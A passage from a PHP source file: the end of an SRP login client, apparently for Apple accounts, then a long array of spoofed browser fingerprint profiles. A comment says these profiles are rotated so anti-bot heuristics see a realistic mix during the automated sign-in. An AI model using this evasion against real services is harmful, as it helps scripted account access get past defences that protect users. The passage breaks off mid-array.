        $kgx = gmp_mod(gmp_mul($k, $gx), $this->N);
        $diff = gmp_mod(gmp_sub(gmp_add($B, $this->N), $kgx), $this->N);
        $exp = gmp_add($this->a, gmp_mul($u, $x));
        $S = gmp_powm($diff, $exp, $this->N);

        // K = H(S)
        $S_bytes = $this->gmpToBytes($S);
        $K = hash('sha256', $S_bytes, true);

        // M1 = calculate_M() from pysrp: H(HNxorHg | H(I) | s | A | B | K)
        // HNxorHg: hash N raw, hash g with padding
        $Hn = hash('sha256', $N_bytes, true);
        $g_padded = str_repeat("\x00", $width - strlen($g_bytes)) . $g_bytes;
        $Hg = hash('sha256', $g_padded, true);
        $HNxorHg = $Hn ^ $Hg;

        $Hu = hash('sha256', $this->username, true);

        // A and B as long_to_bytes() — no padding, just normalized through GMP
        $M1 = hash('sha256', $HNxorHg . $Hu . $salt . $A_bytes . $B_norm . $K, true);

        // M2 (H_AMK) = H(A | M1 | K)
        $this->H_AMK = hash('sha256', $A_bytes . $M1 . $K, true);

        return $M1;
    }

    /** Convert GMP to binary (big-endian, no leading zeros) */
    private function gmpToBytes($num): string
    {
        $hex = gmp_strval($num, 16);
        if (strlen($hex) % 2 !== 0)
            $hex = '0' . $hex;
        return hex2bin($hex);
    }

    /** Pad binary to N size (256 bytes for 2048-bit) */
    private function padTo(string $bytes): string
    {
        $target = 256; // 2048 bits / 8
        $len = strlen($bytes);
        if ($len < $target) {
            return str_repeat("\x00", $target - $len) . $bytes;
        }
        return $bytes;
    }

    /** Pad binary to specific width (matching pysrp's width parameter) */
    private function padToWidth(string $bytes, int $width): string
    {
        $len = strlen($bytes);
        if ($len < $width) {
            return str_repeat("\x00", $width - $len) . $bytes;
        }
        return $bytes;
    }
}

// ============================================================================
// BROWSER FINGERPRINT PROFILES
//
// Each profile drives the User-Agent + Apple-required headers used during the
// SRP auth dance. Profiles are grouped by device family so it's easy to audit
// coverage and rotate sanely. Ordering inside a group is intentional: the
// most-recent OS/browser combos come first so anti-bot heuristics see the
// "current" distribution most often.
//
// Required keys for every profile:
//   tag             unique short id (used for logs / debugging)
//   device          'desktop' | 'mobile' | 'tablet'
//   os              'macOS' | 'iOS' | 'iPadOS' | 'Windows' | 'Linux'
//   os_version      e.g. '14.4', '17.4', '11', '22.04'
//   browser         'Safari' | 'Chrome' | 'Firefox' | 'Edge' | 'Brave' | 'Opera' | 'Arc'
//   browser_version major version string
//   ua              full User-Agent
//   platform        navigator.platform value
//   vendor          navigator.vendor value
//   lang            primary BCP47 language tag
//   tz              IANA timezone (e.g. 'America/Los_Angeles')
//   tz_offset       'GMT-08:00' style offset
//
// Optional keys (Chromium-only Client Hints):
//   sec_ch_ua            full Sec-CH-UA brand list (or null)
//   sec_ch_ua_mobile     '?0' / '?1' (or null)
//   sec_ch_ua_platform   '"macOS"' / '"Windows"' / '"Linux"' / '"iOS"' (or null)
// ============================================================================

$BROWSER_PROFILES = [

    // -------- macOS Safari (Apple-native, no Sec-CH-UA) --------
    ['tag' => 'mac_safari_17_5',  'device' => 'desktop', 'os' => 'macOS', 'os_version' => '14.5',
     'browser' => 'Safari', 'browser_version' => '17.5',
     'ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
     'platform' => 'MacIntel', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'en-US', 'tz' => 'America/Los_Angeles', 'tz_offset' => 'GMT-08:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'mac_safari_17_4',  'device' => 'desktop', 'os' => 'macOS', 'os_version' => '14.4',
     'browser' => 'Safari', 'browser_version' => '17.4',
     'ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
     'platform' => 'MacIntel', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'en-US', 'tz' => 'America/New_York', 'tz_offset' => 'GMT-05:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'mac_safari_17_3',  'device' => 'desktop', 'os' => 'macOS', 'os_version' => '14.3',
     'browser' => 'Safari', 'browser_version' => '17.3',
     'ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
     'platform' => 'MacIntel', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'en-GB', 'tz' => 'Europe/London', 'tz_offset' => 'GMT+00:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'mac_safari_17_2',  'device' => 'desktop', 'os' => 'macOS', 'os_version' => '14.2.1',
     'browser' => 'Safari', 'browser_version' => '17.2',
     'ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
     'platform' => 'MacIntel', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'fr-FR', 'tz' => 'Europe/Paris', 'tz_offset' => 'GMT+01:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'mac_safari_16_6',  'device' => 'desktop', 'os' => 'macOS', 'os_version' => '13.6',
     'browser' => 'Safari', 'browser_version' => '16.6',
     'ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
     'platform' => 'MacIntel', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'ko-KR', 'tz' => 'Asia/Seoul', 'tz_offset' => 'GMT+09:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    // -------- macOS Chrome --------
    ['tag' => 'mac_chrome_125', 'device' => 'desktop', 'os' => 'macOS', 'os_version' => '14.4',
     'browser' => 'Chrome', 'browser_version' => '125',
     'ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
     'platform' => 'MacIntel', 'vendor' => 'Google Inc.',
     'lang' => 'en-US', 'tz' => 'America/Los_Angeles', 'tz_offset' => 'GMT-08:00',
     'sec_ch_ua' => '"Chromium";v="125", "Google Chrome";v="125", "Not.A/Brand";v="24"',
     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"macOS"'],

    ['tag' => 'mac_chrome_124', 'device' => 'desktop', 'os' => 'macOS', 'os_version' => '14.4.1',
     'browser' => 'Chrome', 'browser_version' => '124',
     'ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
     'platform' => 'MacIntel', 'vendor' => 'Google Inc.',
     'lang' => 'en-US', 'tz' => 'America/New_York', 'tz_offset' => 'GMT-05:00',
     'sec_ch_ua' => '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"macOS"'],

    ['tag' => 'mac_chrome_123', 'device' => 'desktop', 'os' => 'macOS', 'os_version' => '14.4',
     'browser' => 'Chrome', 'browser_version' => '123',
     'ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
     'platform' => 'MacIntel', 'vendor' => 'Google Inc.',
     'lang' => 'en-AU', 'tz' => 'Australia/Sydney', 'tz_offset' => 'GMT+11:00',
     'sec_ch_ua' => '"Chromium";v="123", "Google Chrome";v="123", "Not-A.Brand";v="99"',
     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"macOS"'],

    ['tag' => 'mac_chrome_122', 'device' => 'desktop', 'os' => 'macOS', 'os_version' => '14.3.1',
     'browser' => 'Chrome', 'browser_version' => '122',
     'ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
     'platform' => 'MacIntel', 'vendor' => 'Google Inc.',
     'lang' => 'zh-CN', 'tz' => 'Asia/Shanghai', 'tz_offset' => 'GMT+08:00',
     'sec_ch_ua' => '"Chromium";v="122", "Google Chrome";v="122", "Not(A:Brand";v="24"',
     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"macOS"'],

    // -------- macOS Edge / Brave / Arc / Opera --------
    ['tag' => 'mac_edge_124', 'device' => 'desktop', 'os' => 'macOS', 'os_version' => '14.4.1',
     'browser' => 'Edge', 'browser_version' => '124',
     'ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
     'platform' => 'MacIntel', 'vendor' => 'Google Inc.',
     'lang' => 'en-US', 'tz' => 'America/Chicago', 'tz_offset' => 'GMT-06:00',
     'sec_ch_ua' => '"Microsoft Edge";v="124", "Chromium";v="124", "Not-A.Brand";v="99"',
     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"macOS"'],

    ['tag' => 'mac_brave_124', 'device' => 'desktop', 'os' => 'macOS', 'os_version' => '14.4',
     'browser' => 'Brave', 'browser_version' => '124',
     'ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
     'platform' => 'MacIntel', 'vendor' => 'Google Inc.',
     'lang' => 'en-US', 'tz' => 'America/Denver', 'tz_offset' => 'GMT-07:00',
     'sec_ch_ua' => '"Brave";v="124", "Chromium";v="124", "Not-A.Brand";v="99"',
     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"macOS"'],

    ['tag' => 'mac_arc_124', 'device' => 'desktop', 'os' => 'macOS', 'os_version' => '14.4',
     'browser' => 'Arc', 'browser_version' => '1.42',
     'ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
     'platform' => 'MacIntel', 'vendor' => 'Google Inc.',
     'lang' => 'en-US', 'tz' => 'America/Los_Angeles', 'tz_offset' => 'GMT-08:00',
     'sec_ch_ua' => '"Chromium";v="124", "Not-A.Brand";v="99", "Arc";v="1"',
     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"macOS"'],

    ['tag' => 'mac_opera_109', 'device' => 'desktop', 'os' => 'macOS', 'os_version' => '14.4',
     'browser' => 'Opera', 'browser_version' => '109',
     'ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
     'platform' => 'MacIntel', 'vendor' => 'Google Inc.',
     'lang' => 'pt-BR', 'tz' => 'America/Sao_Paulo', 'tz_offset' => 'GMT-03:00',
     'sec_ch_ua' => '"Opera";v="109", "Chromium";v="123", "Not-A.Brand";v="99"',
     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"macOS"'],

    // -------- macOS Firefox --------
    ['tag' => 'mac_firefox_125', 'device' => 'desktop', 'os' => 'macOS', 'os_version' => '14.4',
     'browser' => 'Firefox', 'browser_version' => '125',
     'ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:125.0) Gecko/20100101 Firefox/125.0',
     'platform' => 'MacIntel', 'vendor' => '',
     'lang' => 'sv-SE', 'tz' => 'Europe/Stockholm', 'tz_offset' => 'GMT+01:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'mac_firefox_124', 'device' => 'desktop', 'os' => 'macOS', 'os_version' => '14.3',
     'browser' => 'Firefox', 'browser_version' => '124',
     'ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:124.0) Gecko/20100101 Firefox/124.0',
     'platform' => 'MacIntel', 'vendor' => '',
     'lang' => 'es-ES', 'tz' => 'Europe/Madrid', 'tz_offset' => 'GMT+01:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    // -------- iOS Safari (iPhone) --------
    ['tag' => 'iphone_safari_17_5', 'device' => 'mobile', 'os' => 'iOS', 'os_version' => '17.5',
     'browser' => 'Safari', 'browser_version' => '17.5',
     'ua' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
     'platform' => 'iPhone', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'en-US', 'tz' => 'America/Los_Angeles', 'tz_offset' => 'GMT-08:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'iphone_safari_17_4', 'device' => 'mobile', 'os' => 'iOS', 'os_version' => '17.4.1',
     'browser' => 'Safari', 'browser_version' => '17.4',
     'ua' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
     'platform' => 'iPhone', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'en-US', 'tz' => 'America/New_York', 'tz_offset' => 'GMT-05:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'iphone_safari_17_3', 'device' => 'mobile', 'os' => 'iOS', 'os_version' => '17.3.1',
     'browser' => 'Safari', 'browser_version' => '17.3',
     'ua' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
     'platform' => 'iPhone', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'es-MX', 'tz' => 'America/Mexico_City', 'tz_offset' => 'GMT-06:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'iphone_safari_17_2', 'device' => 'mobile', 'os' => 'iOS', 'os_version' => '17.2.1',
     'browser' => 'Safari', 'browser_version' => '17.2',
     'ua' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
     'platform' => 'iPhone', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'de-DE', 'tz' => 'Europe/Berlin', 'tz_offset' => 'GMT+01:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'iphone_safari_16_7', 'device' => 'mobile', 'os' => 'iOS', 'os_version' => '16.7.4',
     'browser' => 'Safari', 'browser_version' => '16.6',
     'ua' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
     'platform' => 'iPhone', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'ja-JP', 'tz' => 'Asia/Tokyo', 'tz_offset' => 'GMT+09:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'iphone_safari_16_6', 'device' => 'mobile', 'os' => 'iOS', 'os_version' => '16.6',
     'browser' => 'Safari', 'browser_version' => '16.6',
     'ua' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
     'platform' => 'iPhone', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'en-GB', 'tz' => 'Europe/London', 'tz_offset' => 'GMT+00:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    // -------- iOS Chrome (CriOS) and Firefox (FxiOS) --------
    // Note: iOS browsers all use WebKit and do not send Sec-CH-UA headers.
    ['tag' => 'iphone_chrome_124', 'device' => 'mobile', 'os' => 'iOS', 'os_version' => '17.4',
     'browser' => 'Chrome', 'browser_version' => '124',
     'ua' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.71 Mobile/15E148 Safari/604.1',
     'platform' => 'iPhone', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'en-US', 'tz' => 'America/Chicago', 'tz_offset' => 'GMT-06:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'iphone_chrome_123', 'device' => 'mobile', 'os' => 'iOS', 'os_version' => '17.3',
     'browser' => 'Chrome', 'browser_version' => '123',
     'ua' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/123.0.6312.52 Mobile/15E148 Safari/604.1',
     'platform' => 'iPhone', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'en-CA', 'tz' => 'America/Toronto', 'tz_offset' => 'GMT-05:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'iphone_firefox_124', 'device' => 'mobile', 'os' => 'iOS', 'os_version' => '17.3',
     'browser' => 'Firefox', 'browser_version' => '124',
     'ua' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/124.0 Mobile/15E148 Safari/605.1.15',
     'platform' => 'iPhone', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'it-IT', 'tz' => 'Europe/Rome', 'tz_offset' => 'GMT+01:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'iphone_edge_124', 'device' => 'mobile', 'os' => 'iOS', 'os_version' => '17.4',
     'browser' => 'Edge', 'browser_version' => '124',
     'ua' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 EdgiOS/124.0.0.0 Mobile/15E148 Safari/604.1',
     'platform' => 'iPhone', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'en-US', 'tz' => 'America/New_York', 'tz_offset' => 'GMT-05:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    // -------- iPadOS Safari / Chrome --------
    // iPadOS Safari defaults to "desktop class" UA (no "iPad" token, claims macOS).
    ['tag' => 'ipad_safari_17_4_desktopclass', 'device' => 'tablet', 'os' => 'iPadOS', 'os_version' => '17.4',
     'browser' => 'Safari', 'browser_version' => '17.4',
     'ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
     'platform' => 'MacIntel', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'en-US', 'tz' => 'America/Los_Angeles', 'tz_offset' => 'GMT-08:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'ipad_safari_17_3_mobile', 'device' => 'tablet', 'os' => 'iPadOS', 'os_version' => '17.3.1',
     'browser' => 'Safari', 'browser_version' => '17.3',
     'ua' => 'Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
     'platform' => 'iPad', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'fr-FR', 'tz' => 'Europe/Paris', 'tz_offset' => 'GMT+01:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'ipad_safari_17_2_mobile', 'device' => 'tablet', 'os' => 'iPadOS', 'os_version' => '17.2',
     'browser' => 'Safari', 'browser_version' => '17.2',
     'ua' => 'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
     'platform' => 'iPad', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'es-ES', 'tz' => 'Europe/Madrid', 'tz_offset' => 'GMT+01:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'ipad_safari_16_7', 'device' => 'tablet', 'os' => 'iPadOS', 'os_version' => '16.7.4',
     'browser' => 'Safari', 'browser_version' => '16.6',
     'ua' => 'Mozilla/5.0 (iPad; CPU OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
     'platform' => 'iPad', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'en-AU', 'tz' => 'Australia/Sydney', 'tz_offset' => 'GMT+11:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'ipad_chrome_124', 'device' => 'tablet', 'os' => 'iPadOS', 'os_version' => '17.4',
     'browser' => 'Chrome', 'browser_version' => '124',
     'ua' => 'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.71 Mobile/15E148 Safari/604.1',
     'platform' => 'iPad', 'vendor' => 'Apple Computer, Inc.',
     'lang' => 'en-US', 'tz' => 'America/Denver', 'tz_offset' => 'GMT-07:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    // -------- Windows Chrome --------
    ['tag' => 'win_chrome_125', 'device' => 'desktop', 'os' => 'Windows', 'os_version' => '11',
     'browser' => 'Chrome', 'browser_version' => '125',
     'ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
     'platform' => 'Win32', 'vendor' => 'Google Inc.',
     'lang' => 'en-US', 'tz' => 'America/New_York', 'tz_offset' => 'GMT-05:00',
     'sec_ch_ua' => '"Chromium";v="125", "Google Chrome";v="125", "Not.A/Brand";v="24"',
     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"Windows"'],

    ['tag' => 'win_chrome_124', 'device' => 'desktop', 'os' => 'Windows', 'os_version' => '11',
     'browser' => 'Chrome', 'browser_version' => '124',
     'ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
     'platform' => 'Win32', 'vendor' => 'Google Inc.',
     'lang' => 'ru-RU', 'tz' => 'Europe/Moscow', 'tz_offset' => 'GMT+03:00',
     'sec_ch_ua' => '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"Windows"'],

    ['tag' => 'win_chrome_123', 'device' => 'desktop', 'os' => 'Windows', 'os_version' => '10',
     'browser' => 'Chrome', 'browser_version' => '123',
     'ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
     'platform' => 'Win32', 'vendor' => 'Google Inc.',
     'lang' => 'en-CA', 'tz' => 'America/Toronto', 'tz_offset' => 'GMT-05:00',
     'sec_ch_ua' => '"Chromium";v="123", "Google Chrome";v="123", "Not-A.Brand";v="99"',
     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"Windows"'],

    ['tag' => 'win_chrome_122', 'device' => 'desktop', 'os' => 'Windows', 'os_version' => '11',
     'browser' => 'Chrome', 'browser_version' => '122',
     'ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
     'platform' => 'Win32', 'vendor' => 'Google Inc.',
     'lang' => 'en-US', 'tz' => 'America/Chicago', 'tz_offset' => 'GMT-06:00',
     'sec_ch_ua' => '"Chromium";v="122", "Google Chrome";v="122", "Not(A:Brand";v="24"',
     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"Windows"'],

    // -------- Windows Edge --------
    ['tag' => 'win_edge_124', 'device' => 'desktop', 'os' => 'Windows', 'os_version' => '11',
     'browser' => 'Edge', 'browser_version' => '124',
     'ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
     'platform' => 'Win32', 'vendor' => 'Google Inc.',
     'lang' => 'en-US', 'tz' => 'America/Los_Angeles', 'tz_offset' => 'GMT-08:00',
     'sec_ch_ua' => '"Microsoft Edge";v="124", "Chromium";v="124", "Not-A.Brand";v="99"',
     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"Windows"'],

    ['tag' => 'win_edge_122', 'device' => 'desktop', 'os' => 'Windows', 'os_version' => '11',
     'browser' => 'Edge', 'browser_version' => '122',
     'ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
     'platform' => 'Win32', 'vendor' => 'Google Inc.',
     'lang' => 'ja-JP', 'tz' => 'Asia/Tokyo', 'tz_offset' => 'GMT+09:00',
     'sec_ch_ua' => '"Microsoft Edge";v="122", "Chromium";v="122", "Not(A:Brand";v="24"',
     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"Windows"'],

    // -------- Windows Firefox --------
    ['tag' => 'win_firefox_125', 'device' => 'desktop', 'os' => 'Windows', 'os_version' => '11',
     'browser' => 'Firefox', 'browser_version' => '125',
     'ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
     'platform' => 'Win32', 'vendor' => '',
     'lang' => 'en-US', 'tz' => 'America/New_York', 'tz_offset' => 'GMT-05:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'win_firefox_124', 'device' => 'desktop', 'os' => 'Windows', 'os_version' => '10',
     'browser' => 'Firefox', 'browser_version' => '124',
     'ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
     'platform' => 'Win32', 'vendor' => '',
     'lang' => 'it-IT', 'tz' => 'Europe/Rome', 'tz_offset' => 'GMT+01:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'win_firefox_122', 'device' => 'desktop', 'os' => 'Windows', 'os_version' => '11',
     'browser' => 'Firefox', 'browser_version' => '122',
     'ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
     'platform' => 'Win32', 'vendor' => '',
     'lang' => 'nl-NL', 'tz' => 'Europe/Amsterdam', 'tz_offset' => 'GMT+01:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    // -------- Windows Brave / Opera --------
    ['tag' => 'win_brave_124', 'device' => 'desktop', 'os' => 'Windows', 'os_version' => '11',
     'browser' => 'Brave', 'browser_version' => '124',
     'ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
     'platform' => 'Win32', 'vendor' => 'Google Inc.',
     'lang' => 'en-US', 'tz' => 'America/Phoenix', 'tz_offset' => 'GMT-07:00',
     'sec_ch_ua' => '"Brave";v="124", "Chromium";v="124", "Not-A.Brand";v="99"',
     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"Windows"'],

    ['tag' => 'win_opera_109', 'device' => 'desktop', 'os' => 'Windows', 'os_version' => '11',
     'browser' => 'Opera', 'browser_version' => '109',
     'ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
     'platform' => 'Win32', 'vendor' => 'Google Inc.',
     'lang' => 'pt-BR', 'tz' => 'America/Sao_Paulo', 'tz_offset' => 'GMT-03:00',
     'sec_ch_ua' => '"Opera";v="109", "Chromium";v="123", "Not-A.Brand";v="99"',
     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"Windows"'],

    // -------- Linux --------
    ['tag' => 'linux_chrome_124', 'device' => 'desktop', 'os' => 'Linux', 'os_version' => '22.04',
     'browser' => 'Chrome', 'browser_version' => '124',
     'ua' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
     'platform' => 'Linux x86_64', 'vendor' => 'Google Inc.',
     'lang' => 'en-US', 'tz' => 'America/Denver', 'tz_offset' => 'GMT-07:00',
     'sec_ch_ua' => '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
